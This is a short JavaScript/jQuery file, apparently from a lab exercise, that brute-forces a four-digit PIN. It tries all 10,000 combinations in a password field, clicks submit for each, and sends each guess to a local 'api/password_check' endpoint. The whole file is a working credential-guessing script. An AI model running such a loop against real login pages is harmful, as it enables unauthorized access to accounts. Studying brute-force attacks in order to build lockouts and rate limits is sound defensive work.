function pinBreaker() {
  var pin = 0;

  for (i = 0; i < 10000; i++) {
    pin = String(pin);
    while (pin.length < 4) {
      pin = "0" + pin;
    }
    $('#password').val(pin);
    $('#submitButton').trigger("click");  // simulates clicking the submit button [click]_
    pin = parseInt(pin, 10);
    pin++;
  }
  console.log("All combinations failed.");
}

function comboCheck() {
  jqueryGetButtonAction();
}

function jqueryGetButtonAction() {
  var passwordValue = $('#password').val();
  console.log(passwordValue);
  var url = "api/password_check?password="+passwordValue+"&submitButton=Submit"; // sets url to one that indicates the password being submitted

  $.get(url, null, function (dataFromServer) {
      console.log("Finished calling servlet.");
      console.log(dataFromServer);
    }
  ); // submits a request for the url set above

}
var start = $('#startButton');
start.on("click", pinBreaker);

var submit = $('#submitButton');
submit.on("click", comboCheck);
